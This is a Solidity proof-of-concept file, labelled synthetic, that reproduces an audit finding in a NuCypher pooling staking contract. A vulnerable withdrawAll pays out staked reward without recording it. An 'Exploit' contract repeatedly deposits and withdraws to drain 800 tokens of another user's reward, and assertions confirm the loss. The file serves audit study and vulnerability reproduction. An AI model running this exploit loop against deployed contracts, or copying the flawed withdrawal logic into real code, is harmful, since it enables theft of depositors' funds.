// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  NuCypher PoolingStakingContractV2 — deposit/withdrawAll sniffs reward
    that is still staked (MixBytes, AuditVault 28529).
    SYNTHETIC, cheatcode-free. The audited brownie loop, with the
    pre-7dfe82fb withdrawAll (no "deposit disabled" check).
    escrow.getAllTokens is 9000, user1 deposits 100000, user2 loops
    deposit 100 / withdrawAll one hundred times. Each pass pays 8 of
    user1's tokens. user2 nets 800. user1 is then owed 108199 against
    a free balance of 99200. With the stake cleared, the same loop nets 0. */

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
}

contract NuToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external {
        allowance[msg.sender][spender] = amount;
    }

    function transfer(address to, uint256 amount) external {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
    }

    function transferFrom(address from, address to, uint256 amount) external {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }
}

library SafeERC20 {
    function safeTransfer(NuToken token, address to, uint256 amount) internal {
        token.transfer(to, amount);
    }

    function safeTransferFrom(NuToken token, address from, address to, uint256 amount) internal {
        token.transferFrom(from, to, amount);
    }
}

contract StakingEscrow {
    uint256 public allTokens;

    function setAllTokens(uint256 amount) external {
        allTokens = amount;
    }

    function getAllTokens(address) external view returns (uint256) {
        return allTokens;
    }
}

contract PoolingStakingContractV2 {
    using SafeMath for uint256;
    using SafeERC20 for NuToken;

    uint256 public constant BASIS_FRACTION = 10000;

    struct Delegator {
        uint256 depositedTokens;
        uint256 withdrawnReward;
        uint256 withdrawnETH;
    }

    NuToken public token;
    StakingEscrow public escrow;
    address public workerOwner;
    uint256 public totalDepositedTokens;
    uint256 public totalWithdrawnReward;
    uint256 public totalWithdrawnETH;
    uint256 public workerFraction;
    uint256 public workerWithdrawnReward;
    bool public depositIsEnabled = true;
    mapping(address => Delegator) public delegators;

    constructor(NuToken token_, StakingEscrow escrow_, uint256 workerFraction_) {
        token = token_;
        escrow = escrow_;
        workerFraction = workerFraction_;
        workerOwner = address(0xB0B5);
    }

    function depositTokens(uint256 _value) external {
        require(depositIsEnabled, "Deposit must be enabled");
        require(_value > 0, "Value must be not empty");
        totalDepositedTokens = totalDepositedTokens.add(_value);
        Delegator storage delegator = delegators[msg.sender];
        delegator.depositedTokens = delegator.depositedTokens.add(_value);
        token.safeTransferFrom(msg.sender, address(this), _value);
    }

    function getAvailableDelegatorReward() public view returns (uint256) {
        uint256 stakedTokens = escrow.getAllTokens(address(this));
        uint256 freeTokens = token.balanceOf(address(this));
        uint256 reward = stakedTokens.add(freeTokens).sub(totalDepositedTokens);
        if (reward > freeTokens) {
            return freeTokens;
        }
        return reward;
    }

    function getCumulativeReward() public view returns (uint256) {
        return getAvailableDelegatorReward().add(totalWithdrawnReward);
    }

    function getAvailableWorkerReward() public view returns (uint256) {
        uint256 reward = getCumulativeReward();
        uint256 maxAllowableReward;
        if (totalDepositedTokens != 0) {
            uint256 fraction = workerFraction;
            maxAllowableReward = reward.mul(fraction).div(BASIS_FRACTION);
        } else {
            maxAllowableReward = reward;
        }
        if (maxAllowableReward > workerWithdrawnReward) {
            return maxAllowableReward - workerWithdrawnReward;
        }
        return 0;
    }

    function getAvailableDelegatorReward(address _delegator) public view returns (uint256) {
        if (totalDepositedTokens == 0) {
            return 0;
        }
        uint256 reward = getCumulativeReward();
        Delegator storage delegator = delegators[_delegator];
        uint256 fraction = workerFraction;
        uint256 maxAllowableReward = reward.mul(delegator.depositedTokens).mul(BASIS_FRACTION - fraction).div(
            totalDepositedTokens.mul(BASIS_FRACTION)
        );
        if (maxAllowableReward > delegator.withdrawnReward) {
            return maxAllowableReward - delegator.withdrawnReward;
        }
        return 0;
    }

    function getAvailableETH(address _delegator) public view returns (uint256) {
        Delegator storage delegator = delegators[_delegator];
        uint256 balance = address(this).balance;
        balance = balance.add(totalWithdrawnETH);
        uint256 maxAllowableETH = balance.mul(delegator.depositedTokens).div(totalDepositedTokens);
        uint256 availableETH = maxAllowableETH.sub(delegator.withdrawnETH);
        if (availableETH > address(this).balance) {
            availableETH = address(this).balance;
        }
        return availableETH;
    }

    function withdrawAll() public {
        uint256 balance = token.balanceOf(address(this));

        Delegator storage delegator = delegators[msg.sender];
        uint256 availableReward = getAvailableDelegatorReward(msg.sender);
        uint256 value = availableReward.add(delegator.depositedTokens);
        require(value <= balance, "Not enough tokens in the contract");

        uint256 availableWorkerReward = getAvailableWorkerReward();
        uint256 availableETH = getAvailableETH(msg.sender);

        uint256 workerReward = availableWorkerReward.mul(delegator.depositedTokens).div(totalDepositedTokens);
        if (workerReward > 0) {
            require(value.add(workerReward) <= balance, "Not enough tokens in the contract");
            token.safeTransfer(workerOwner, workerReward);
        }

        uint256 withdrawnToDecrease = workerWithdrawnReward.mul(delegator.depositedTokens).div(totalDepositedTokens);

        workerWithdrawnReward = workerWithdrawnReward.sub(withdrawnToDecrease);
        totalWithdrawnReward = totalWithdrawnReward.sub(withdrawnToDecrease).sub(delegator.withdrawnReward);
        totalDepositedTokens = totalDepositedTokens.sub(delegator.depositedTokens);

        delegator.withdrawnReward = 0;
        delegator.depositedTokens = 0;

        // @> VULN: the reward inside `value` is paid and is not added to totalWithdrawnReward.
        token.safeTransfer(msg.sender, value);

        totalWithdrawnETH = totalWithdrawnETH.sub(delegator.withdrawnETH);
        delegator.withdrawnETH = 0;
        if (availableETH > 0) {
            payable(msg.sender).transfer(availableETH);
        }
    }
}

contract Victim {
    function deposit(PoolingStakingContractV2 pool, NuToken token, uint256 amount) external {
        token.approve(address(pool), amount);
        pool.depositTokens(amount);
    }
}

contract Exploit {
    NuToken public token;
    StakingEscrow public escrow;
    PoolingStakingContractV2 public pool;
    Victim public victim;
    uint256 public initial;
    uint256 public sniffed;
    uint256 public poolFree;
    uint256 public user1Owed;

    constructor() {
        token = new NuToken();
        escrow = new StakingEscrow();
        pool = new PoolingStakingContractV2(token, escrow, 1);
        victim = new Victim();
        escrow.setAllTokens(9000);
        token.mint(address(victim), 100_000);
        token.mint(address(this), 10_000);
        initial = 10_000;
    }

    function _loop() internal {
        victim.deposit(pool, token, 100_000);
        for (uint256 i = 0; i < 100; i++) {
            token.approve(address(pool), 100);
            pool.depositTokens(100);
            pool.withdrawAll();
        }
    }

    function run() external {
        _loop();
        sniffed = token.balanceOf(address(this)) - initial;
        poolFree = token.balanceOf(address(pool));
        user1Owed = pool.getAvailableDelegatorReward(address(victim)) + 100_000;
        require(sniffed == 800, "sniffed 800");
        require(poolFree == 99200, "pool 99200");
        require(user1Owed == 108199, "owed 108199");
        require(user1Owed > poolFree, "user1 cannot withdraw");
    }

    function runUnstaked() external {
        escrow.setAllTokens(0);
        _loop();
        sniffed = token.balanceOf(address(this)) - initial;
        poolFree = token.balanceOf(address(pool));
        require(sniffed == 0, "no sniff");
        require(poolFree == 100_000, "user1 intact");
    }
}
